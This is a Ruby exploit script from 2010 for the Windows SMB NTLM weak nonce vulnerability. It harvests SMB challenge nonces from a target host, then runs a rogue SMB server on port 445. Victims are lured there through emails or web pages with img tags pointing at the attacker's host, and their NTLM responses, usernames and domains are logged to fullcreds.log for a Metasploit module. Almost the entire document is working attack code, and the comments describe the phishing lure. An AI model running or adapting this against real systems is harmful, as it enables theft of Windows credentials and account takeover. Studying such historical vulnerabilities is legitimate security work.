
# Windows SMB NTLM Authentication Weak Nonce Vulnerability
# (c) 2010 Hernan Ochoa (hernan@ampliasecurity.com)
# This script can be used to connect to the victim to obtain weak nonces
# and then waiting for connections from the victim to have it encrypt those weak nonces for us
# The victim can be 'forced' to connect to this server using several methods, as an example
# you can take a look at the conn.html file which creates an HTML document with several <IMG SRC> tags
# that connect to this server.
# The weak nonces, encrypted nonces, username and domainname are stored in the file fullcreds.log
# to then be used with the msf_smb_weak_nonce.rb metasploit module for exploitation

require 'socket'
require 'time'


def collectnonces(host, port, num)

	count = 1
	nonces = []
	nonces_filename = "nonces.log"
	f = 0

 	if File.file?( nonces_filename ) then
                File.delete( nonces_filename )
        end


	while 1 == 1 :

		neg_proto_packet_1 = 
		"00000054" +
		"ff534d4272000000001801c00000000000000000000000000000866100005480003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200"

		#so = nil
		so = TCPSocket.open(host, port)

		n = neg_proto_packet_1.scan(/../).map { |s| s.to_i(16) }
		j = n.pack("C*")
		so.write(j)
		resp, x = so.recvfrom(2000)

		j = resp[0x49..0x49+7]
		test = j.unpack("C*").map { |v|  ("%.2x" % (v)).chomp }
		#puts "\r" + test.to_s + "    "

		#so.close

		#sleep(0.1)
		f = 1
		nonces.each do |hay|
			if hay == test.to_s
				print "duplicate! (#" + count.to_s + ", #" + f.to_s + ")\a\a\a\a\a\a\a\a\a\a\a\a\n"
			end
			f = f + 1
		end

		nonces << test.to_s

		challenge =  (test.to_s + "\n").to_s
		File.open(nonces_filename, 'a') { |f| f.write(challenge) }
		count = count + 1
		print "\r# of nonces obtained: " + count.to_s + "                               "

		#	 if count % 100 == 0
		#                sleep(1)
		#        end

		if count == (num+1)
			print "\n"
			return
		end

	end
end

# from metasploit...
# framework-3.2/lib/rex/proto/smb/utils.rb
def time_unix_to_smb(unix_time)
	t64 = (unix_time + 11644473600) * 10000000
	thi = (t64 & 0xffffffff00000000) >> 32
	tlo = (t64 & 0x00000000ffffffff)
	return [thi, tlo]
end

def waitforcreds(thenonces, num)

	nonces_ndx =  0
	conn_num = 0
	maxn = num 


	neg_proto_response_1 = 
	"00000051" + # NetBIOS Session Service header
	"ff534d4272000000008801c00000000000000000000000000000fffe00000000" + # SMB Header
	"1105000302000100041100000000010000000000fde30000007632d28015ca010000080c00e486962656d5869400000000"  # Negotiate Protocol Response

	session_setupandx_access_denied = 
	"00000023" + # NetBIOS Session Service Header
	"ff534d4273220000c08801c00000000000000000000000000000fffe00000400000000" + # SMB Header
	"000000" # Session and SetupX Response payload


	creds_filename = "fullcreds.log"

 	if File.file?( creds_filename ) then
                File.delete( creds_filename )
        end


	server = TCPServer.open(445)
	loop {

		if conn_num > maxn
			Thread.exit
			return
		end
	
		Thread.start(server.accept) do |client|
		
			conn_num = conn_num + 1
			if conn_num > maxn
				puts "done!"
				client.close()
				server.shutdown
				Thread.exit
				return
			end
			puts conn_num


			# (1) receive Negotiate Protocol Request

			q, x = client.recvfrom(2000)
			puts "neg proto request received"
			pid1 = q[0x1e]
			pid2 = q[0x1f]
			multi1 = q[0x1e+4]
			multi2 = q[0x1f+4]

			# (2) send Negotiate Protocol Response

			# set challenge in response packet 
			puts thenonces[nonces_ndx].to_s
			neg_proto_response_1[146..146+15] = thenonces[nonces_ndx].chomp
			# TODO: SET CORRECT TIME
			timehi, timelo = time_unix_to_smb(Time.now.to_i)
			# send packet 
			n = neg_proto_response_1.scan(/../).map { |s| s.to_i(16) }
			# set process id
			#puts pid1
			#puts pid2
			#puts multi1
			#puts multi2
			n[0x1e] = pid1
			n[0x1f] = pid2
			n[0x1e+4] = multi1
			n[0x1f+4] = multi2
	
			s = ("%.8x" % timelo)
			ss = s[6].chr + s[7].chr + s[4].chr + s[5].chr + s[2].chr + s[3].chr + s[0].chr + s[1].chr

			dlo = (ss.scan(/../)).map { |s| s.to_i(16) }

			s = ("%.8x" % timehi)
			ss = s[6].chr + s[7].chr + s[4].chr + s[5].chr + s[2].chr + s[3].chr + s[0].chr + s[1].chr

			dhi = (ss.scan(/../)).map { |s| s.to_i(16) }

			n[0x3c..0x3c+3] = dlo
			n[0x40..0x40+3] = dhi

			# timezone = 0
			#n[0x45] = 0
			#n[0x46] = 0
			j = n.pack("C*")
			client.write(j)
			puts "neg proto response sent"

			# (3) Receive Session Setup andX Request
			q, x = client.recvfrom(4000)
			puts "session setup andx request received!"
			pid1 = q[0x1e]
			pid2 = q[0x1f]
			multi1 = q[0x1e+4]
			multi2 = q[0x1f+4]

			# we assume the first request is anonymous
			# and we send back an Error: STATUS_ACCESS_DENIED
			n = session_setupandx_access_denied.scan(/../).map { |s| s.to_i(16) }
			n[0x1e] = pid1
			n[0x1f] = pid2
			n[0x1e+4] = multi1
			n[0x1f+4] = multi2
			#n[0x44/2] = pid1multi1
			#n[0x45/2] = multi2
			#n[0x3c/2] = pid1
			#n[0x3d/2] = pid2
			#puts n

			begin
				j = n.pack("C*")
			rescue
				puts $! 
			end
		
			client.write(j)
			puts "session setupandx access denied sent!"

			# (4) Receive Session Setup andX Request with creds
			q, x = client.recvfrom(4000)
			puts "session setup andx request with creds received!"

			# Get the ANSI Password 
			ansi_pwd = q[0x41..0x41+23]
			ansi_pwd_s = (ansi_pwd.unpack("C*").map { |v|  ("%.2x" % (v)).chomp }).to_s
			puts ansi_pwd_s

			# Get the Unicode Password
			unicode_pwd = q[0x59..0x59+23]
			unicode_pwd_s = (unicode_pwd.unpack("C*").map { |v|  ("%.2x" % (v)).chomp }).to_s
			puts unicode_pwd_s

			# Get the username (0x71)
			i = 0
			v = 0
			username = "" 
			while v == 0
				if q[0x71+i] == 0 and q[0x71+i+1] == 0
					v = 1
				end
				if q[0x71+i] != 0
					username = username + q[0x71+i].chr
				end
				i = i + 1
			end

			i = 0x71 + i + 1
			domain = ""
			v = 0
			k = 0
			while v == 0:
				if q[i+k] == 0 and q[i+k+1] == 0
					v = 1
				end
				if q[i+k] != 0
					domain = domain + q[i+k].chr
				end
				k = k + 1
			end

			puts username
			puts domain

			File.open(creds_filename, "a") { |f| f.write( thenonces[nonces_ndx].to_s + "," + ansi_pwd_s + "," + unicode_pwd_s + "," + username + "," + domain + "\n") }
	
			client.close
			nonces_ndx = nonces_ndx + 1

		end
 	}

end

def savecreds(num)

	nonces = []
	nonces_filename = "nonces.log"

	# load nonces to send to victim 
	data = ""
	File.open(nonces_filename, 'r') { |f| data = f.read() }
	nonces = data.split(/\n/)

	# wait for victim to encrypt the nonces
	waitforcreds(nonces, num)

end



# MAIN

	print "Windows SMB NTLM Authentication weak nonce Vulnerability"
	print "\n(c) 2010 Hernan Ochoa (hernan@ampliasecurity.com)\n"
	
	if ARGV.size < 1 then
		print "syntax: setup_smb_weak_nonce.rb <target host> <optional:number_of_nonces_to_collect, by default:8000>\n"
		exit
	end

	
	host = ARGV[0]
	port = 445
	nonces_count = 8000

	if ARGV.size >= 2 then
		nonces_count = ARGV[1].to_i
	end
		
		
	# gather nonces by connecting to victim
	# nonces are saved to 'nonces.log'
	# 100 = number of nonces to collect
	puts "collecting nonces..."
	collectnonces(host, port, nonces_count)
	puts "done collecting nonces.."

	# now, we expect connections from the victim
	# so we can use those connections to have the victim
	# encrypt the nonces with the hases of his/her password
	#the connections can be forced by
	#using the classic technique of sending an email
	#with link to a web page, a web page that may contain html tags like
	#<img src="\\<attacker>\pepe">
	# for each <img> tag the victim will initiate 4 connections (it retries automatically..)
	# so that's good for an attacker, lowers the number of
	# connections it needs to force from the victim

	puts "waiting for connections from victim"
	savecreds(1000)
